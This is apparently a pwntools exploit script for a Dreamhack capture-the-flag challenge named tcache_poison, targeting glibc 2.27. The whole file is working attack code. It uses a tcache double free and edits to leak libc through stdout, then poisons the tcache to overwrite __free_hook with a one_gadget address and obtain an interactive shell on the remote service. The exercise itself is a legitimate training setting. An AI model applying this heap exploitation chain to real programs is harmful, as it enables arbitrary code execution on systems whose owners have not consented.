#!/usr/bin/env python3

from pwn import *

exe = ELF('tcache_poison_patched', checksec=False)
libc = ELF('libc-2.27.so', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+158

        
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 20395)
else:
    p = process([exe.path])
GDB()

def allocate(size, content):
    sln(1)
    slna(b'Size: ', size)
    sla(b'Content: ', content)

def free():
    sln(2)

def print_func():
    sln(3)

def edit(chunk):
    sln(4)
    sla(b'chunk: ', chunk)

###########################
### STAGE 1: Leak libc ####
###########################
# Double free
allocate(16, b'AAAA')
free()
edit(b'A'*8)
free()
edit(p64(exe.sym['stdout']))

allocate(16, b'A')
allocate(1, b'')
print_func()

p.recvuntil(b'Content: ')
libc_leak = u64(p.recv(6).ljust(8, b'\0'))
libc.address = libc_leak - 0x3ec760
info("Libc leak: " + hex(libc_leak))
info("Libc base: " + hex(libc.address))

############################
### STAGE 2: Double free ###
############################
allocate(200, p64(libc.sym['__free_hook']))
allocate(200, b'CCCC')
free()
edit(b'A'*8)
free()

######################################################
### STAGE 3: Overwrite oneshot by tcache poisoning ###
######################################################
oneshot = [0x4f432, 0xe54a8, 0xe5622, 0x10a41c]
one_gadget = libc.address + oneshot[0]
edit(p64(libc.sym['__free_hook']))
allocate(200, b'A')
# Gan buf la __free_hook roi thay gia tri thanh oneshot
allocate(200, p64(one_gadget))
free()

p.interactive()
